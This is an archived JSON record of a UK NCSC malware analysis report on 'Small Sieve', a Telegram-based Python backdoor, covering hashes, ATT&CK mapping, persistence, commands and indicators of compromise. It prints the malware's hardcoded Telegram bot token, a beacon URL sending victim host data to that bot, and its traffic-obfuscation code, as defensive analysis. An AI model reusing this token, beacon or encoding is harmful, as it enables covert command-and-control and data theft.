{
    "id": "0cabfb6c-2efc-4ef9-b920-19de109aa7ad",
    "created_at": "2022-10-27T08:36:19.055742Z",
    "updated_at": "2025-03-27T02:05:32.467516Z",
    "deleted_at": null,
    "sha1_hash": "5f3f611d0981bc28ab8f03a57ed3c57942a118d0",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-02-24T12:48:59Z",
    "file_modification_date": "2022-02-24T12:48:59Z",
    "file_size": 412115,
    "plain_text": "# Small Sieve\n\n### Malware Analysis Report\n\n**Version 1.0**\n\n\n**27 January 2022**\n© Crown Copyright 2022\n\n\n-----\n\n## Small Sieve\n\n##### Telegram Bot API based Python backdoor with file download and execution capability\n\n Executive summary\n\n  - Use of the Telegram Bot API reduces visibility to network defenders\n\n  - Custom string and traffic obfuscation routines are also employed to evade detection\n\n  - Functionality is limited to downloading files and command line execution\n\n##### Introduction\n\nSmall Sieve is a simple – possibly disposable – Python backdoor which is distributed using an NSIS\ninstaller that performs persistence. It provides basic functionality required to maintain and expand a\nfoothold in victim infrastructure using custom string and traffic obfuscation schemes together with the\nTelegram Bot API to avoid detection.\n\n\n-----\n\n##### Malware details\n\n###### Metadata\n\n**Filename** `gram_app.exe`\n```\n         NSIS installer which installs and runs the index.exe backdoor and adds a\n\n```\n**Description**\n```\n         persistence registry key\n\n```\n**Size** `16999598 bytes`\n**MD5** `15fa3b32539d7453a9a85958b77d4c95`\n**SHA-1** `11d594f3b3cf8525682f6214acb7b7782056d282`\n**SHA-256** `b75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054`\n**Compile time** `2021-09-25 21:57:46 UTC`\n\n**Filename** `index.exe`\n**Description** `The final PyInstaller-bundled Python 3.9 backdoor`\n**Size** `17263089 bytes`\n**MD5** `5763530f25ed0ec08fb26a30c04009f1`\n**SHA-1** `2a6ddf89a8366a262b56a251b00aafaed5321992`\n**SHA-256** `bf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37d3a2`\n**Compile time** `2021-08-01 04:39:46 UTC`\n\n|Metadata|Col2|\n|---|---|\n|Filename|gram_app.exe|\n|Description|NSIS installer which installs and runs the index.exe backdoor and adds a persistence registry key|\n|Size|16999598 bytes|\n|MD5|15fa3b32539d7453a9a85958b77d4c95|\n|SHA-1|11d594f3b3cf8525682f6214acb7b7782056d282|\n|SHA-256|b75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054|\n|Compile time|2021-09-25 21:57:46 UTC|\n\n|Filename|index.exe|\n|---|---|\n|Description|The final PyInstaller-bundled Python 3.9 backdoor|\n|Size|17263089 bytes|\n|MD5|5763530f25ed0ec08fb26a30c04009f1|\n|SHA-1|2a6ddf89a8366a262b56a251b00aafaed5321992|\n|SHA-256|bf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37d3a2|\n|Compile time|2021-08-01 04:39:46 UTC|\n\n\n-----\n\n###### MITRE ATT&CK[® ]\n\nThis report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible\nknowledge base of adversary tactics and techniques based on real-world observations.\n\n###### Tactic ID Technique Procedure\n\nExecution [T1059.006](https://attack.mitre.org/techniques/T1059/006) Command and Small Sieve is a PyInstaller-packed\nScripting Interpreter: Python script.\nPython\n\nPersistence [T1547.001](https://attack.mitre.org/techniques/T1547/001) Boot or Logon Small Sieve is started by a registry run\nAutostart Execution: key.\nRegistry Run Keys /\nStartup Folder\n\nDefense [T1027](https://attack.mitre.org/techniques/T1027) Obfuscated Files or Small Sieve uses a custom hex byte\nEvasion Information swapping encoding scheme combined\n\nwith an obfuscated base64 function to\nprotect program strings and updated\nTelegram credentials.\n\nDefense [T1036.005](https://attack.mitre.org/techniques/T1036/005/) Masquerading: Small Sieve uses variations of Microsoft\nEvasion Match Legitimate (Microsift) and Outlook in its filenames to\n\nName or Location attempt to avoid detection during casual\n\ninspection.\n\nCommand And [T1071.001](https://attack.mitre.org/techniques/T1071/001) Application Layer Small Sieve beacons and tasking are\nControl Protocol: Web performed using the Telegram API over\n\nProtocols HTTPS.\n\nCommand And [T1132.002](https://attack.mitre.org/techniques/T1132/002) Data Encoding: Non- Small Sieve employs a custom hex byte\nControl Standard Encoding swapping encoding scheme to obfuscate\n\ntasking traffic.\n\nDefense [T1480](https://attack.mitre.org/techniques/T1480) Execution Guardrails The Small Sieve payload will only\nEvasion execute correctly if the word 'Platypus' is\n\npassed to it on the command line.\n\n|Tactic|ID|Technique|Procedure|\n|---|---|---|---|\n|Execution|T1059.006|Command and Scripting Interpreter: Python|Small Sieve is a PyInstaller-packed Python script.|\n|Persistence|T1547.001|Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder|Small Sieve is started by a registry run key.|\n|Defense Evasion|T1027|Obfuscated Files or Information|Small Sieve uses a custom hex byte swapping encoding scheme combined with an obfuscated base64 function to protect program strings and updated Telegram credentials.|\n|Defense Evasion|T1036.005|Masquerading: Match Legitimate Name or Location|Small Sieve uses variations of Microsoft (Microsift) and Outlook in its filenames to attempt to avoid detection during casual inspection.|\n|Command And Control|T1071.001|Application Layer Protocol: Web Protocols|Small Sieve beacons and tasking are performed using the Telegram API over HTTPS.|\n|Command And Control|T1132.002|Data Encoding: Non- Standard Encoding|Small Sieve employs a custom hex byte swapping encoding scheme to obfuscate tasking traffic.|\n|Defense Evasion|T1480|Execution Guardrails|The Small Sieve payload will only execute correctly if the word 'Platypus' is passed to it on the command line.|\n\n\n-----\n\n##### Functionality\n\n###### Installation\n\nSmall Sieve is distributed as a large (16MB) Nullsoft Scriptable Install System (NSIS) installer named\n```\ngram_app.exe which does not appear to masquerade as a legitimate application. Once executed,\n\n```\nthe backdoor binary index.exe is installed in the user’s AppData/Roaming directory and is added\nas a Run key in the registry to enabled persistence after reboot.\n\nThe installer then executes the backdoor with the ‘Platypus’ argument, which is also present in the\nregistry persistence key:\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift.\n\n###### Configuration\n\n```\nThe backdoor attempts to restore previously initialised session data from\n```\n%LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt.\n\n```\nIf this file does not exist then it uses the following hardcoded values:\n\n**Field** **Value** **Description**\n\nChat ID 2090761833 The Telegram Channel ID that beacons are\nsent to, and from which tasking requests are\nreceived. Tasking requests are dropped if they\ndo not come from this channel. This value\ncannot be changed.\n\nBot ID Random value between 10,000,000 and A bot identifier generated at startup which is\n90,000,000 sent to the C2 in the initial beacon. Commands\n\nmust be prefixed with /com[Bot ID] in\norder to be processed by the malware,\n\nTelegram 2003026094: The initial token used to authenticate each\nToken AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY message to the Telegram Bot API\n\n_Table 1: Credentials and session values_\n\n|Field|Value|Description|\n|---|---|---|\n|Chat ID|2090761833|The Telegram Channel ID that beacons are sent to, and from which tasking requests are received. Tasking requests are dropped if they do not come from this channel. This value cannot be changed.|\n|Bot ID|Random value between 10,000,000 and 90,000,000|A bot identifier generated at startup which is sent to the C2 in the initial beacon. Commands must be prefixed with /com[Bot ID] in order to be processed by the malware,|\n|Telegram Token|2003026094: AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY|The initial token used to authenticate each message to the Telegram Bot API|\n\n\n-----\n\n###### Tasking\n\nSmall Sieve beacons using the Telegram Bot API, sending the configured Bot ID, the currently logged\nin user and the host’s IP address, as described in the ‘Communications (Beacon format)’ section of\nthis report. It then waits for tasking as a Telegram bot using the python-telegram-bot module.\n\nTwo task formats are supported:\n\n  - `/start - no argument is passed, this causes the beacon information to be repeated.`\n\n  - `/com[BotID] [command] – for issuing commands passed in the argument.`\n\nThe following commands are supported by the second of these formats:\n\n**Command** **Description**\n\ndelete Causes the backdoor to exit. Does not remove persistence.\n\ndownload url””filename The url will be fetched and saved to the provided filename using the Python urllib\nmodule urlretrieve function.\n\nchange token””newtoken The backdoor will reconnect to the Telegram Bot API using the provided token\n**newtoken. This updated token will be stored in the encoded**\n```\n                MicrosoftWindowsOutlookDataPlus.txt file.\n\n```\ndisconnect The original connection to Telegram is terminated. Likely used after a ‘change\n**token’ command is issued.**\n\n_Table 2: Supported commands_\n\nAny commands other than those detailed in Table 2 are executed directly by passing them to\n`cmd.exe /c`, and the output is returned as a reply.\n\n###### Defence evasion\n\n Anti-sandbox\nSmall Sieve makes use of an execution guardrail by using a command line argument in the name of\nsome of its classes and methods.\n\n|Command|Description|\n|---|---|\n|delete|Causes the backdoor to exit. Does not remove persistence.|\n|download url””filename|The url will be fetched and saved to the provided filename using the Python urllib module urlretrieve function.|\n|change token””newtoken|The backdoor will reconnect to the Telegram Bot API using the provided token newtoken. This updated token will be stored in the encoded MicrosoftWindowsOutlookDataPlus.txt file.|\n|disconnect|The original connection to Telegram is terminated. Likely used after a ‘change token’ command is issued.|\n\n```\ndef bYQKqMEkIrYTvzs8cupMpFSwzcWjs4cB__Platypus_():\n  startCommand = commandClass.CallMember(\n'smoo20k4eVAq0XWu0zfQM5X5PP8z6Si7__' + argv[1] + '_', ..\nif __name__ == “__main__”:\n  locals()['bYQKqMEkIrYTvzs8cupMpFSwzcWjs4cB__' + argv[1] + '_']()\n\n```\n\n_Figure 1: Execution guardrail_\n\nThis may be intended to make it slightly more resistant to analysis than if it were to simply check that\nthe word ‘Platypus’ is passed on the command line\n\n###### String obfuscation\nInternal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64encoded. A decryption script is included in ‘Appendix A’.\n\n\n-----\n\n##### Communications\n\n###### Beacon format\n\nBefore listening for tasking using CommandHandler objects from the python-telegram-bot\nmodule, a beacon is generated manually using the standard requests library:\n```\n https://api.telegram.org/bot2003026094:AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXr\n Y/sendMessage?chat_id=2090761833&parse_mode=Markdown&text=/com39062050%20\n |%208313e22333e27313e2031302c70213e49414d4f444e49475f2e696d64616\n Telegram Bot Telegram Bot Command prefix including Encoded\n  API URI API token randomly generated Bot ID host data\n\n```\nThe hex host data is encoded using the byte shuffling algorithm as described in the ‘Communications\n(Traffic obfuscation)’ section of this report. The example shown above decodes to:\n```\n              admin/WINDOMAIN1 | 10.17.32.18\n\n###### Traffic obfuscation\n\n```\nAlthough traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and\nresponse using a hex byte shuffling algorithm. A Python3 implementation is shown in Figure 2.\n\n|https://api.telegram.org/bot2003026094:AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXr Y/sendMessage?chat_id=2090761833&parse_mode=Markdown&text=/com39062050%20 |%208313e22333e27313e2031302c70213e49414d4f444e49475f2e696d64616|Col2|Col3|Col4|\n|---|---|---|---|\n|Telegram Bot API URI|Telegram Bot API token|Command prefix including randomly generated Bot ID|Encoded host data|\n\n```\ndef Swap3(inputstr):\n  inputCopy = list(inputstr)\n  swapIndex = 0\n  for index in range (len(inputstr)-1, 0, -2):\n     if swapIndex < index:\n      swapTmp = inputCopy[swapIndex]\n      inputCopy[swapIndex] = inputCopy[index]\n      inputCopy[index] = swapTmp\n    swapIndex += 3\n  return ''.join(inputCopy)\ndef ReverseString(inputstr): return inputstr[::-1]\ndef Decode(inputstr): \n  return bytes.fromhex(Swap3(ReverseString(Swap3(inputstr)))).decod\ne('utf-8')\ndef Encode(inputstr): \n  return Swap3(ReverseString(Swap3(bytes.hex(inputstr.encode('utf8')))))\n\n```\n\n_Figure 2: A traffic encoding scheme based on hex conversion and shuffling_\n\n\n-----\n\n##### Detection\n\n###### Indicators of compromise\n\n|Type|Description|Values|\n|---|---|---|\n|Path|Telegram Session Persistence File (Obfuscated)|%LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt|\n|Path|Installation path of the Small Sieve binary|%AppData%\\OutlookMicrosift\\index.exe|\n|Registry value name|Persistence Registry Key pointing to index.exe with a ‘Platypus’ argument|HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift|\n\n\n-----\n\n##### Appendix A: String recovery script\n\n```\n‘’’\nThis script demonstrates recovery of obfuscated strings found in the \nindex.pyc file extracted from the index.exe binary \n(2A6DDF89A8366A262B56A251B00AAFAED5321992) of Small Sieve\nThis will also recover bot credentials cached in \n\"%LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt\"\n'''\nimport base64\nextractedStrings = [ 'QA==', 'FQIpFlEnAD8QGQ==', 'QA1s', 'BB47ClknDDpZ', \n'EhM=', 'Tw==', '_', 'Py4hBVwmMgE=', 'FQUqSQ0=','FR8nClo/A34aGEI=', 'AxwoSlA\nwCH5WFA8=','KD87L2MuX248HBlHPmcgIGMQTU40OCATWzRHZlsmDRwRK30yPys/FSYXaw==','Q\nHthSRhlQHNUWgJeagBcRQttU1RRUW4=','RT0jB1QkLC4JM04HJggtJU8jDBYPNAI+OipYSl8iNT\nk7AEExMTQCBCcFZEJFPQRXPzo=','FQIpFlspADs=', 'ExwjCwd4BmocIW4Cd3UmHRY6GCgxbjx\n/PRMOVAYGL0ERK30yPys/FSYXaw==', 'TxIjCQ==', 'EwUtFkE=','ORQ/RHEhHj0WGUEWJFk=\n', 'UkF1VAJ+XGZKRA==', 'AxktClItTQ==', 'BBQgAUEt', 'FxM=', 'Ax4h', 'HA==',\n'Dh4AL2AGIDBPOkwrPxQEOVwuLy8ZalQuFXBVWQE7Fz0RK30yPys/FSYXaw==', 'RgEtFkYtMjM\nWE0pOCkwDA0IvCRdaLwEyGX4=', 'ORQ/RGEnBjsX', 'FB4nAVs=', 'NSN5IG8bDhpAD2gVDR5\nCMn83OigVNV15AnBPa2oRMxARK30yPys/FSYXaw==', 'Dxpv', 'CAU4FEZyQnEYB0ZdM0gdDU\nEyHxRSNBYtQiFZWg==', 'BxsGKG8CABscQh8JKmILW2EOMBAGGVUlHBtDYWQ6HDIRK30yPys/FS\nYXaw==''BEg2AQABXBoDEkgrAFkyCUgKDTcYHy8bOidGHnMlBBUGK3IOMj4yHCMRR3E=', 'BBg/\nB1omAzsaAw==', 'Lzo=','TwIpClEFCC0KFkgWeE4ZCVIfFx1B', 'DQUpMlccPxQVR1UEH2Ij\nXHYrHQMZIgkOGzV5RHNjEEURK30yPys/FSYXaw==','UkF8VwV6W25AQxUyBmoeAVI2DhoEaDcMN\n3FpGGkvDwV6OEwBNSYCI2I0VnZCFw==', 'PAUpCUUXAisNG0AcLHIfWgg0Bg0=',\n'ExgrClQkTTEXG1ZTMEIDA1VgFxdcNgUjA2NCRkIwJxJuG0t+KjcjRT4FXUAQJ0RXIjwfAg0DNF8\n=', 'JSMeXhU=','MT0YUX0FXjEMR3o0fmIZMUU0FRQlCBYmOjBbTQQ/MQERK30yPys/FSYXaw==\n' ]\ndef DecodeString(encodeArg):\n  customAlphabet = '`qLd5Hm^yw/sG-qh&@~y|[dJmC6.0UFvNt^^_FeSd4.0N*#GNophwQ-MCJ1?>L73PY'\n  result = ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(encodeArg, cu\nstomAlphabet)])\n  return result\ndef Base64DecodeString(arg):\n  return DecodeString(base64.b64decode(arg).decode())\nif __name__ == \"__main__\":\n  for x in extractedStrings:\n    print(f'\"{x}\" => \"{Base64DecodeString(x)}\"')\n\n```\n\n-----\n\n#### Disclaimer\n\n\nThis report draws on information derived from NCSC and industry sources. Any NCSC findings\nand recommendations made have not been provided with the intention of avoiding all risks and\nfollowing the recommendations will not remove all such risk. Ownership of information risks\nremains with the relevant system owner at all times.\n\nThis information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt\nunder other UK information legislation.\n\nRefer any FOIA queries to ncscinfoleg@ncsc.gov.uk.\n\nAll material is UK Crown Copyright ©\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf"
    ],
    "report_names": [
        "NCSC-Malware-Analysis-Report-Small-Sieve.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666859779,
    "ts_updated_at": 1743041132,
    "ts_creation_date": 1645706939,
    "ts_modification_date": 1645706939,
    "files": {
        "pdf": "https://archive.orkl.eu/5f3f611d0981bc28ab8f03a57ed3c57942a118d0.pdf",
        "text": "https://archive.orkl.eu/5f3f611d0981bc28ab8f03a57ed3c57942a118d0.txt",
        "img": "https://archive.orkl.eu/5f3f611d0981bc28ab8f03a57ed3c57942a118d0.jpg"
    }
}